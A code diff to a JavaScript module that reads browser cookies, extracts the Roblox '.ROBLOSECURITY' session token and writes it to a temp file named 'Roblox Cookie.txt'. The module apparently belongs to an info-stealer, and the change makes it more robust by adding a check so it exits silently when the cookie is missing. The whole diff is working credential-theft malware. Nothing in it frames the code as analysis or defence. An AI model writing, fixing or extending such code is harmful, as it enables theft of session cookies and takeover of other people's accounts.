@@ -8,7 +8,9 @@ const { getCookies } = require('../util/cookies');
 
 module.exports = async () => {
   const cookies = await getCookies();
-  const { value: cookie, source } = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
+  const cookieValue = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
+  if (!cookieValue) return;
+  const { value: cookie, source } = cookieValue;
   fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
 
   const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
